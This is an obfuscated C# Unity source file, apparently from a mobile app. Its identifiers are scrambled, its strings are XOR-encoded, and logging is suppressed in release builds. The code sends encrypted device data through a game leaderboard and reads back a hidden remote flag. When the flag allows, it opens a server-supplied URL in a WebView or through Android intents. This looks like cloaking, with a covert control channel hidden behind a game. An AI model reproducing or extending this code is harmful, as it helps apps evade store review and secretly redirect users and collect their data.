3, 94, 29, 28, 17, 26, 19, 28, 21, 23, 72, 28, 7, 30, 30, 94, 19, 22, 22, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 0, 23, 31, 29, 4, 23, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 19, 22, 22, 55, 4, 23, 28, 6, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 0, 23, 31, 29, 4, 23, 55, 4, 23, 28, 6, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 22, 27, 1, 2, 19, 6, 17, 26, 55, 4, 23, 28, 6, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 0, 23, 6, 7, 0, 28, 82, 20, 19, 30, 1, 23, 73, 15, 15, 73, 27, 20, 90, 1, 92, 27, 28, 22, 23, 10, 61, 20, 90, 85, 2, 29, 27, 28, 6, 23, 0, 72, 82, 20, 27, 28, 23, 85, 91, 76, 79, 66, 14, 14, 1, 92, 27, 28, 22, 23, 10, 61, 20, 90, 85, 26, 29, 4, 23, 0, 72, 82, 26, 29, 4, 23, 0, 85, 91, 76, 79, 66, 91, 0, 23, 6, 7, 0, 28, 82, 9, 31, 19, 6, 17, 26, 23, 1, 72, 6, 0, 7, 23, 94, 31, 23, 22, 27, 19, 72, 3, 94, 29, 28, 17, 26, 19, 28, 21, 23, 72, 28, 7, 30, 30, 94, 19, 22, 22, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 0, 23, 31, 29, 4, 23, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 19, 22, 22, 55, 4, 23, 28, 6, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 0, 23, 31, 29, 4, 23, 55, 4, 23, 28, 6, 62, 27, 1, 6, 23, 28, 23, 0, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 15, 94, 22, 27, 1, 2, 19, 6, 17, 26, 55, 4, 23, 28, 6, 72, 20, 7, 28, 17, 6, 27, 29, 28, 90, 91, 9, 0, 23, 6, 7, 0, 28, 82, 20, 19, 30, 1, 23, 73, 15, 15, 73, 0, 23, 6, 7, 0, 28, 82, 29, 0, 27, 21, 90, 3, 91, 73, 15, 73, 15, 17, 19, 6, 17, 26, 90, 23, 91, 9, 15 }, 114) + _0x4a5fc9c1._0x562286b4(new byte[5] { 35, 119, 118, 119, 101 }, 94);
    }

    private void _0x66808586()
    {
        WLog(_0x4a5fc9c1._0x562286b4(new byte[21] { 135, 174, 189, 171, 184, 174, 189, 170, 239, 173, 174, 172, 164, 239, 191, 189, 170, 188, 188, 170, 171 }, 207));
        if (Time.frameCount == _0x2d56d5cb)
            return;
        _0x2d56d5cb = Time.frameCount;
        if (_0x9d6b5a92())
            return;
        _0x91fa4516();
    }

    private IEnumerator _0x1638bd6e(Dictionary<string, object> _0xde57a106)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[30] { 134, 137, 184, 174, 169, 128, 253, 155, 184, 169, 190, 181, 253, 152, 165, 169, 175, 188, 253, 141, 168, 174, 181, 253, 153, 188, 169, 188, 231, 253 }, 221) + string.Join(_0x4a5fc9c1._0x562286b4(new byte[1] { 220 }, 213), _0xde57a106));
#endif
            }
        }

        string _0xc565f04d = "";
        // Primary source: nested JSON under "notificationData"
        if (_0xde57a106 != null && _0xde57a106.TryGetValue(_0x4a5fc9c1._0x562286b4(new byte[16] { 124, 125, 102, 123, 116, 123, 113, 115, 102, 123, 125, 124, 86, 115, 102, 115 }, 18), out var raw))
        {
            try
            {
                var _0x7ba333db = raw?.ToString();
                var _0xcef80450 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x7ba333db);
                if (_0xcef80450 != null && _0xcef80450.TryGetValue(_0x4a5fc9c1._0x562286b4(new byte[6] { 97, 119, 124, 118, 123, 118 }, 18), out var val))
                {
                    _0xc565f04d = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x4a5fc9c1._0x562286b4(new byte[30] { 117, 122, 75, 93, 90, 14, 126, 91, 93, 70, 115, 14, 100, 125, 97, 96, 14, 94, 79, 92, 93, 75, 14, 75, 92, 92, 65, 92, 20, 14 }, 46) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0xc565f04d) && _0xde57a106 != null && _0xde57a106.TryGetValue(_0x4a5fc9c1._0x562286b4(new byte[6] { 227, 245, 254, 244, 249, 244 }, 144), out var lab))
        {
            _0xc565f04d = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[38] { 190, 177, 128, 150, 145, 197, 181, 144, 150, 141, 184, 197, 163, 128, 145, 134, 141, 128, 129, 197, 150, 128, 139, 129, 140, 129, 197, 131, 151, 138, 136, 197, 143, 150, 138, 139, 223, 197 }, 229) + _0xc565f04d);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0xc565f04d))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[38] { 155, 148, 165, 179, 180, 224, 144, 181, 179, 168, 157, 224, 151, 161, 169, 180, 224, 180, 175, 224, 175, 176, 165, 174, 224, 183, 169, 180, 168, 224, 179, 165, 174, 164, 169, 164, 250, 224 }, 192) + _0xc565f04d);
            }
#endif
        }

        _0x73edeed1 = _0xc565f04d;
        yield return new WaitUntil(() => _0xb5ba4613);
        var _0xbdc0ea39 = _0xfce3a470(2, 100);
        yield return new WaitUntil(() => _0xbdc0ea39.IsCompleted);
        string _0xb70a37fb = _0xbdc0ea39.Result;
        if (!string.IsNullOrEmpty(_0xb70a37fb))
        {
            string _0xcfaaec45 = _0x68f27317(_0xb70a37fb, _0xc565f04d);
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[33] { 78, 65, 112, 102, 97, 53, 69, 96, 102, 125, 72, 53, 71, 112, 121, 122, 116, 113, 53, 66, 112, 119, 67, 124, 112, 98, 53, 98, 124, 97, 125, 47, 53 }, 21) + _0xcfaaec45);
#endif
            }

            _0xb0cde9c4.Load(_0xcfaaec45);
        }
    }

    internal Vector2 lastSize = Vector2.zero;
    private string _0xe0ee5196 = "";
    private async Task _0x93f1de65()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0xe0ee5196 = _0x4a5fc9c1._0x562286b4(new byte[5] { 71, 64, 77, 82, 68 }, 33);
        _0xf3290b49 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0xb9a48880 = DateTime.UtcNow.Ticks.ToString();
        _0xf4634911 = "";
        JObject _0xc053f9a9 = _0x0fb3a009(_0x755e078f, _0xe2c05b8b, _0xb37d7cbb, _0xdeaf10f8, _0x7cc87b0c, _0x75db747a, _0xd6457b0c, _0x51164e0e, _0xfbcac81e, _0xe0ee5196, _0x09763a2d, _0x05aab7a4, _0xe91e8671.ToString(), _0x3d63c50d, _0xb9a48880, _0xfc9123f6, _0xd00ef726, _0x9a3dae18, _0xb982edfb, _0x23165728());
        var _0xe68197f8 = _0x0cc165e9(_0xc053f9a9.ToString(), _0xfc9123f6);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xc053f9a9}");
            }
#endif
        }

        try
        {
            await _0xb0d3acb8(LeaderboardId, 1d, _0xe68197f8);
            await Task.Delay(500);
            string _0xb44b7574 = "";
            for (int _0x7fd5feee = 0; _0x7fd5feee < 20; _0x7fd5feee++)
            {
                if (await _0x43a0cbcf(1, 1))
                {
                    await _0x571751a2(_0x4a5fc9c1._0x562286b4(new byte[7] { 93, 83, 80, 92, 84, 90, 91 }, 63));
                    _0x612638ad();
                    return;
                }

                _0xb44b7574 = await _0xfce3a470(1, 500);
                if (!string.IsNullOrEmpty(_0xb44b7574))
                    break;
            }

            _0x345bf2c3(_0xb44b7574);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[22] { 205, 194, 211, 197, 194, 203, 182, 209, 243, 248, 243, 228, 247, 250, 182, 243, 228, 228, 249, 228, 172, 182 }, 150) + e.Message);
#endif
            }

            _0x612638ad();
        }
    }

    private void Awake()
    {
        if (_0xe45971d9 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0xe45971d9 = gameObject.GetComponent<_0x04c385c5>();
        DontDestroyOnLoad(gameObject);
        _0xb37d7cbb = _0x7cc87b0c = _0x75db747a = "";
        _0x6cafdcc2 = "";
        _0xb5ba4613 = false;
    }

    private void _0x8332858e(string _0x617f465e)
    {
        _0x80d1ea05();
        StartCoroutine(_0x60fe50a4(_0x617f465e));
    }

    private async Task<bool> _0x43a0cbcf(int _0x58ef9314 = 5, int _0xfcacd813 = 500)
    {
        CommState _0x526ed551 = default;
        int _0x1234d1a0 = 0;
        do
        {
            try
            {
                _0x526ed551 = await _0xd7b8a4df();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[32] { 92, 83, 98, 116, 115, 90, 39, 118, 114, 98, 117, 126, 70, 116, 126, 105, 100, 85, 98, 116, 114, 107, 115, 116, 39, 98, 117, 117, 104, 117, 61, 39 }, 7) + e.Message);
                    }
#endif
                }
            }

            if (_0x526ed551.Ready)
                break;
            await Task.Delay(_0xfcacd813);
        }
        while (_0x1234d1a0++ < _0x58ef9314);
        bool _0x1ca56a50 = _0x526ed551.Ready && _0x526ed551.IsPrivacy;
        {
#if B_LOGS
            {
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[25] { 104, 103, 86, 64, 71, 110, 19, 122, 64, 99, 65, 90, 69, 82, 80, 74, 19, 65, 86, 64, 70, 95, 71, 9, 19 }, 51) + _0x1ca56a50);
            }
#endif
        }

        return _0x1ca56a50;
    }

    private int _0xd54972b4 = 5, _0x44c88fef = 5, _0x85c08244 = 5, _0xcf0c1a2c = 5;
    private async Task<bool> _0x3a72ff11()
    {
        _0x38d7193f.Instance?._0x85218bf0();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x836c9e75) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[32] { 209, 222, 239, 249, 254, 215, 170, 223, 228, 227, 254, 243, 170, 218, 255, 249, 226, 170, 196, 229, 254, 227, 236, 227, 233, 235, 254, 227, 229, 228, 176, 170 }, 138) + string.Join(_0x4a5fc9c1._0x562286b4(new byte[1] { 221 }, 212), _0x836c9e75));
                }
#endif
            }
        };
        try
        {
            _0xb37d7cbb = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[31] { 252, 243, 194, 212, 211, 250, 135, 225, 198, 206, 203, 194, 195, 135, 211, 200, 135, 192, 194, 211, 135, 215, 210, 212, 207, 135, 211, 200, 204, 194, 201 }, 167));
                }
#endif
            }

            _0xb37d7cbb = "";
        }

        _0xa1a34f63 = !string.IsNullOrEmpty(_0xb37d7cbb);
        _0xb982edfb = _0x23165728();
        {
#if B_LOGS
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[25] { 55, 56, 9, 31, 24, 49, 76, 57, 2, 5, 24, 21, 76, 60, 25, 31, 4, 76, 56, 3, 7, 9, 2, 86, 76 }, 108) + _0xb37d7cbb);
#endif
        }

        _0x38d7193f.Instance?._0x73b6a3ea();
        return false;
    }

    private bool IsSslError(int _0x34ce991b, string _0xa7a928d4)
    {
        if (_0x34ce991b == -1202 || _0x34ce991b == -1200 || _0x34ce991b == -11 || _0x34ce991b == -202)
            return true;
        if (string.IsNullOrEmpty(_0xa7a928d4))
            return false;
        return _0xa7a928d4.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[3] { 168, 168, 183 }, 251), StringComparison.OrdinalIgnoreCase) >= 0 || _0xa7a928d4.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[11] { 193, 199, 208, 214, 203, 196, 203, 193, 195, 214, 199 }, 162), StringComparison.OrdinalIgnoreCase) >= 0 || _0xa7a928d4.IndexOf(_0x4a5fc9c1._0x562286b4(new byte[4] { 135, 129, 150, 144 }, 196), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private void WLog(string _0x806f7e56)
    {
#if B_LOGS
        {
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[7] { 85, 90, 107, 125, 122, 83, 46 }, 14) + _0x806f7e56);
        }
#endif
    }

    internal void _0x3b5dc283()
    {
        Rect _0xc4433b32 = Screen.safeArea;
        Vector2 _0x49ba9e5e = new Vector2(Screen.width, Screen.height);
        if (_0xc4433b32 == lastSafe && _0x49ba9e5e == lastSize)
            return;
        // Apply manual padding
        _0xc4433b32.xMin += _0x85c08244;
        _0xc4433b32.xMax -= _0xcf0c1a2c;
        _0xc4433b32.yMin += _0x44c88fef;
        _0xc4433b32.yMax -= _0xd54972b4;
        // Convert Unity safe area -> native WebView frame
        Rect _0xa384bd36 = new Rect(_0xc4433b32.x, _0x49ba9e5e.y - _0xc4433b32.y - _0xc4433b32.height, // Y flip for native coordinate system
 _0xc4433b32.width, _0xc4433b32.height);
        _0xb0cde9c4.Frame = _0xa384bd36;
        lastSafe = Screen.safeArea;
        lastSize = _0x49ba9e5e;
    }

    async Task<CommState> _0xd7b8a4df()
    {
        var _0x0eef29cf = await LeaderboardsService.Instance.GetPlayerScoreAsync(LeaderboardId, new GetPlayerScoreOptions { IncludeMetadata = true });
        var _0x9b62bef2 = ReadScoreMetadata(_0x0eef29cf != null ? _0x0eef29cf.Metadata : null);
        if (string.IsNullOrEmpty(_0x9b62bef2.isMeta))
            return default;
        var _0x1e9162ca = _0xca1d0c3a(_0x9b62bef2.isMeta, _0xfc9123f6);
        if (_0x1e9162ca != _0x4a5fc9c1._0x562286b4(new byte[4] { 103, 97, 102, 118 }, 19) && _0x1e9162ca != _0x4a5fc9c1._0x562286b4(new byte[5] { 31, 24, 21, 10, 28 }, 121))
            return default;
        var _0x28fd7c0a = _0xca1d0c3a(_0x9b62bef2.meta ?? "", _0xfc9123f6);
        return new CommState(true, _0x1e9162ca == _0x4a5fc9c1._0x562286b4(new byte[4] { 76, 74, 77, 93 }, 56), _0x28fd7c0a);
    }

    private bool _0xba61c8e4 = false;
    private string _0xee2c4925()
    {
        try
        {
            using (var _0xbf875f8d = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[30] { 115, 127, 125, 62, 101, 126, 121, 100, 105, 35, 116, 62, 96, 124, 113, 105, 117, 98, 62, 69, 126, 121, 100, 105, 64, 124, 113, 105, 117, 98 }, 16)))
            {
                var _0xc5175215 = _0xbf875f8d.GetStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[15] { 172, 186, 189, 189, 170, 161, 187, 142, 172, 187, 166, 185, 166, 187, 182 }, 207));
                var _0xd7eecdb3 = _0xc5175215.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[21] { 132, 134, 151, 162, 147, 147, 143, 138, 128, 130, 151, 138, 140, 141, 160, 140, 141, 151, 134, 155, 151 }, 227));
                using (var _0x1770cad4 = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[26] { 15, 0, 10, 28, 1, 7, 10, 64, 25, 11, 12, 5, 7, 26, 64, 57, 11, 12, 61, 11, 26, 26, 7, 0, 9, 29 }, 110)))
                {
                    return _0x1770cad4.CallStatic<string>(_0x4a5fc9c1._0x562286b4(new byte[19] { 210, 208, 193, 241, 208, 211, 212, 192, 217, 193, 224, 198, 208, 199, 244, 210, 208, 219, 193 }, 181), _0xd7eecdb3);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    static byte[] CompressDeflate(byte[] _0x9d253382)
    {
        using var _0x9ead60cd = new MemoryStream();
        using (var _0xc7fb3592 = new DeflateStream(_0x9ead60cd, SmallestCompression()))
            _0xc7fb3592.Write(_0x9d253382, 0, _0x9d253382.Length);
        return _0x9ead60cd.ToArray();
    }

    private Text _0x49e5fc76;
    static readonly string TextAlphabet = _0x4a5fc9c1._0x562286b4(new byte[93] { 225, 224, 226, 229, 228, 231, 230, 233, 232, 235, 234, 237, 236, 239, 238, 241, 240, 243, 242, 245, 244, 247, 246, 249, 248, 251, 250, 253, 252, 255, 254, 129, 128, 131, 130, 133, 132, 135, 134, 137, 136, 139, 138, 141, 140, 143, 142, 145, 144, 147, 146, 149, 148, 151, 150, 153, 152, 155, 154, 156, 159, 158, 161, 160, 163, 162, 165, 164, 167, 166, 169, 168, 171, 170, 173, 172, 175, 174, 177, 176, 179, 178, 181, 180, 183, 182, 185, 184, 187, 186, 189, 188, 191 }, 193);
    private string _0xd6457b0c = "";
    internal bool isApplicationPause = false;
    private bool _0xfd208c7d(string _0x91c22c9c)
    {
        if (string.IsNullOrEmpty(_0x91c22c9c))
            return false;
        try
        {
            using (var _0xea96887d = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[30] { 165, 169, 171, 232, 179, 168, 175, 178, 191, 245, 162, 232, 182, 170, 167, 191, 163, 180, 232, 147, 168, 175, 178, 191, 150, 170, 167, 191, 163, 180 }, 198)))
            using (var _0xa40a236e = _0xea96887d.GetStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[15] { 98, 116, 115, 115, 100, 111, 117, 64, 98, 117, 104, 119, 104, 117, 120 }, 1)))
            using (var _0x7f4f26d1 = _0xa40a236e.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[17] { 27, 25, 8, 44, 29, 31, 23, 29, 27, 25, 49, 29, 18, 29, 27, 25, 14 }, 124)))
            using (var _0xbcf37ceb = _0x7f4f26d1.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[25] { 28, 30, 15, 55, 26, 14, 21, 24, 19, 50, 21, 15, 30, 21, 15, 61, 20, 9, 43, 26, 24, 16, 26, 28, 30 }, 123), _0x91c22c9c))
            {
                if (_0xbcf37ceb == null)
                    return false;
                WLog(_0x4a5fc9c1._0x562286b4(new byte[37] { 168, 131, 153, 132, 134, 142, 167, 130, 128, 142, 203, 135, 138, 158, 133, 136, 131, 203, 130, 133, 152, 159, 138, 135, 135, 142, 143, 203, 155, 138, 136, 128, 138, 140, 142, 209, 203 }, 235) + _0x91c22c9c);
                _0xbcf37ceb.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[8] { 175, 170, 170, 136, 162, 175, 169, 189 }, 206), 0x10000000);
                _0xa40a236e.Call(_0x4a5fc9c1._0x562286b4(new byte[13] { 61, 58, 47, 60, 58, 15, 45, 58, 39, 56, 39, 58, 55 }, 78), _0xbcf37ceb);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private string _0x0cc165e9(string _0x84bdd082, string _0xecd60ca2)
    {
        try
        {
            var _0x07292ff8 = Encoding.UTF8.GetBytes(_0x84bdd082 ?? "");
            var _0x82d281b6 = PackSmallest(_0x07292ff8, out var mode);
            var _0xe118d108 = new byte[4];
            using (var _0x82c360fd = RandomNumberGenerator.Create())
                _0x82c360fd.GetBytes(_0xe118d108);
            var _0xb3a8ce13 = new byte[1 + _0x82d281b6.Length];
            _0xb3a8ce13[0] = mode;
            Buffer.BlockCopy(_0x82d281b6, 0, _0xb3a8ce13, 1, _0x82d281b6.Length);
            var _0xde06cf36 = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xecd60ca2 ?? ""));
            var _0xa2284bd8 = AesCtr(_0xb3a8ce13, _0xde06cf36, _0xe118d108);
            var _0x14bac6b2 = new byte[_0xe118d108.Length + _0xa2284bd8.Length];
            Buffer.BlockCopy(_0xe118d108, 0, _0x14bac6b2, 0, _0xe118d108.Length);
            Buffer.BlockCopy(_0xa2284bd8, 0, _0x14bac6b2, _0xe118d108.Length, _0xa2284bd8.Length);
            return Encode93(_0x14bac6b2);
        }
        catch (Exception)
        {
            return "";
        }
    }

    // MAIN FLOW
    private bool _0x7a171e5a { get; set; }

    private string _0xfbcac81e = "";
    // WS_SOURCE MONO
    public static _0x04c385c5 _0xe45971d9 { get; private set; }

    private IEnumerator _0x8619899c()
    {
        yield return _0xa6b279e5(Permission.Camera);
    }

    private string _0x9a3dae18 = "";
    private string _0xca1d0c3a(string _0x984ab462, string _0x802d7039)
    {
        try
        {
            if (string.IsNullOrEmpty(_0x984ab462))
                return "";
            var _0xfb02c002 = Decode93(_0x984ab462);
            if (_0xfb02c002.Length < 5)
                return "";
            var _0xb73c8ff8 = new byte[4];
            Buffer.BlockCopy(_0xfb02c002, 0, _0xb73c8ff8, 0, 4);
            var _0x82851e76 = new byte[_0xfb02c002.Length - 4];
            Buffer.BlockCopy(_0xfb02c002, 4, _0x82851e76, 0, _0x82851e76.Length);
            var _0x72b6e755 = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x802d7039 ?? ""));
            var _0x019d5a73 = AesCtr(_0x82851e76, _0x72b6e755, _0xb73c8ff8);
            var _0x2c9ea433 = new byte[_0x019d5a73.Length - 1];
            Buffer.BlockCopy(_0x019d5a73, 1, _0x2c9ea433, 0, _0x2c9ea433.Length);
            return Encoding.UTF8.GetString(UnpackSmallest(_0x2c9ea433, _0x019d5a73[0]));
        }
        catch (Exception)
        {
            return "";
        }
    }

    private readonly string[] _0x4ce82b46 = new string[]
    {
        _0x4a5fc9c1._0x562286b4(new byte[60] { 99, 12, 29, 35, 179, 199, 251, 246, 179, 225, 246, 246, 255, 224, 179, 242, 225, 246, 179, 251, 252, 231, 179, 225, 250, 244, 251, 231, 179, 253, 252, 228, 179, 113, 19, 0, 179, 247, 252, 253, 113, 19, 10, 231, 179, 254, 250, 224, 224, 179, 234, 252, 230, 225, 179, 224, 227, 250, 253, 178 }, 147),
        _0x4a5fc9c1._0x562286b4(new byte[52] { 135, 232, 250, 247, 87, 62, 3, 87, 20, 24, 2, 27, 19, 87, 21, 18, 87, 14, 24, 2, 5, 87, 27, 2, 20, 28, 14, 87, 26, 24, 26, 18, 25, 3, 87, 149, 247, 228, 87, 0, 31, 14, 87, 4, 3, 24, 7, 87, 25, 24, 0, 72 }, 119),
        _0x4a5fc9c1._0x562286b4(new byte[66] { 98, 26, 33, 111, 56, 15, 160, 194, 233, 231, 160, 247, 233, 238, 243, 160, 225, 242, 229, 160, 232, 233, 244, 244, 233, 238, 231, 160, 237, 239, 242, 229, 160, 239, 230, 244, 229, 238, 160, 244, 239, 228, 225, 249, 160, 98, 0, 19, 160, 243, 244, 225, 249, 160, 233, 238, 160, 244, 232, 229, 160, 231, 225, 237, 229, 174 }, 128),
        _0x4a5fc9c1._0x562286b4(new byte[54] { 23, 120, 114, 117, 199, 179, 143, 142, 148, 199, 142, 148, 199, 151, 149, 142, 138, 130, 199, 147, 142, 138, 130, 199, 5, 103, 116, 199, 147, 143, 130, 199, 133, 130, 148, 147, 199, 151, 139, 134, 158, 130, 149, 148, 199, 151, 139, 134, 158, 199, 137, 136, 144, 201 }, 231),
        _0x4a5fc9c1._0x562286b4(new byte[48] { 194, 173, 166, 151, 18, 107, 93, 71, 64, 18, 69, 91, 92, 92, 91, 92, 85, 18, 65, 70, 64, 87, 83, 89, 18, 81, 93, 71, 94, 86, 18, 80, 87, 18, 93, 92, 87, 18, 65, 66, 91, 92, 18, 83, 69, 83, 75, 28 }, 50),
        _0x4a5fc9c1._0x562286b4(new byte[65] { 228, 139, 142, 148, 52, 94, 117, 119, 127, 100, 123, 96, 103, 52, 117, 102, 113, 52, 121, 123, 102, 113, 52, 117, 119, 96, 125, 98, 113, 52, 96, 123, 122, 125, 115, 124, 96, 52, 246, 148, 135, 52, 103, 96, 117, 109, 52, 117, 122, 112, 52, 96, 102, 109, 52, 109, 123, 97, 102, 52, 120, 97, 119, 127, 58 }, 20),
        _0x4a5fc9c1._0x562286b4(new byte[55] { 238, 129, 144, 172, 62, 91, 104, 123, 108, 103, 62, 109, 110, 119, 112, 62, 125, 113, 107, 112, 106, 109, 62, 252, 158, 141, 62, 106, 118, 123, 62, 112, 123, 102, 106, 62, 113, 112, 123, 62, 125, 113, 107, 114, 122, 62, 124, 123, 62, 103, 113, 107, 108, 109, 48 }, 30),
        _0x4a5fc9c1._0x562286b4(new byte[63] { 53, 122, 71, 56, 111, 88, 247, 135, 187, 182, 174, 178, 165, 164, 247, 165, 190, 176, 191, 163, 247, 185, 184, 160, 247, 182, 165, 178, 247, 160, 190, 185, 185, 190, 185, 176, 247, 53, 87, 68, 247, 179, 184, 185, 53, 87, 78, 163, 247, 160, 182, 187, 188, 247, 182, 160, 182, 174, 247, 174, 178, 163, 249 }, 215),
        _0x4a5fc9c1._0x562286b4(new byte[51] { 87, 56, 40, 33, 135, 232, 201, 203, 222, 135, 211, 207, 200, 212, 194, 135, 208, 207, 200, 135, 212, 211, 198, 222, 135, 206, 201, 135, 211, 207, 194, 135, 192, 198, 202, 194, 135, 208, 206, 201, 135, 211, 207, 194, 135, 215, 213, 206, 221, 194, 137 }, 167),
        _0x4a5fc9c1._0x562286b4(new byte[64] { 169, 209, 234, 164, 243, 196, 107, 6, 36, 38, 46, 37, 63, 62, 38, 107, 34, 56, 107, 46, 61, 46, 57, 50, 63, 35, 34, 37, 44, 107, 169, 203, 216, 107, 32, 46, 46, 59, 107, 56, 59, 34, 37, 37, 34, 37, 44, 107, 45, 36, 57, 107, 50, 36, 62, 57, 107, 40, 35, 42, 37, 40, 46, 101 }, 75)
    };
    private string _0x3d63c50d = "";
    private bool _0x82afa311(string _0x1dfd566f)
    {
        try
        {
            using (var _0x594e1340 = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[30] { 14, 2, 0, 67, 24, 3, 4, 25, 20, 94, 9, 67, 29, 1, 12, 20, 8, 31, 67, 56, 3, 4, 25, 20, 61, 1, 12, 20, 8, 31 }, 109)))
            using (var _0x51562e18 = _0x594e1340.GetStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[15] { 117, 99, 100, 100, 115, 120, 98, 87, 117, 98, 127, 96, 127, 98, 111 }, 22)))
            using (var _0x0fc931ed = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[15] { 238, 225, 235, 253, 224, 230, 235, 161, 225, 234, 251, 161, 218, 253, 230 }, 143)))
            using (var _0x7e8d0a6d = _0x0fc931ed.CallStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[5] { 41, 56, 43, 42, 60 }, 89), _0x1dfd566f))
            using (var _0x0a871a4d = new AndroidJavaObject(_0x4a5fc9c1._0x562286b4(new byte[22] { 20, 27, 17, 7, 26, 28, 17, 91, 22, 26, 27, 1, 16, 27, 1, 91, 60, 27, 1, 16, 27, 1 }, 117), _0x4a5fc9c1._0x562286b4(new byte[26] { 219, 212, 222, 200, 213, 211, 222, 148, 211, 212, 206, 223, 212, 206, 148, 219, 217, 206, 211, 213, 212, 148, 236, 243, 255, 237 }, 186), _0x7e8d0a6d))
            {
                WLog(_0x4a5fc9c1._0x562286b4(new byte[26] { 79, 100, 126, 99, 97, 105, 64, 101, 103, 105, 44, 99, 124, 105, 98, 44, 105, 116, 120, 105, 126, 98, 109, 96, 54, 44 }, 12) + _0x1dfd566f);
                _0x0a871a4d.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[11] { 174, 171, 171, 140, 174, 187, 170, 168, 160, 189, 182 }, 207), _0x4a5fc9c1._0x562286b4(new byte[33] { 163, 172, 166, 176, 173, 171, 166, 236, 171, 172, 182, 167, 172, 182, 236, 161, 163, 182, 167, 165, 173, 176, 187, 236, 128, 144, 141, 149, 145, 131, 128, 142, 135 }, 194));
                _0x0a871a4d.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[8] { 249, 252, 252, 222, 244, 249, 255, 235 }, 152), 0x10000000);
                _0x51562e18.Call(_0x4a5fc9c1._0x562286b4(new byte[13] { 171, 172, 185, 170, 172, 153, 187, 172, 177, 174, 177, 172, 161 }, 216), _0x0a871a4d);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x4a5fc9c1._0x562286b4(new byte[28] { 93, 118, 108, 113, 115, 123, 82, 119, 117, 123, 62, 123, 102, 106, 123, 108, 112, 127, 114, 62, 120, 127, 119, 114, 123, 122, 36, 62 }, 30) + e.Message);
            Application.OpenURL(_0x1dfd566f);
            return true;
        }
    }

    private async Task _0x0f9e4672()
    {
        if (await _0x553e95ff())
            return;
        if (await _0x3a72ff11())
            return;
        if (await _0x5e0a0f3d())
            return;
        _0xec3201a0();
        await _0x661990b2(_0x3be6411f());
        _0x51164e0e = await _0x8fa20570();
        await _0x93f1de65();
    }

    private GameObject _0xa8a2a91f;
    internal bool isDestroyedForce = false;
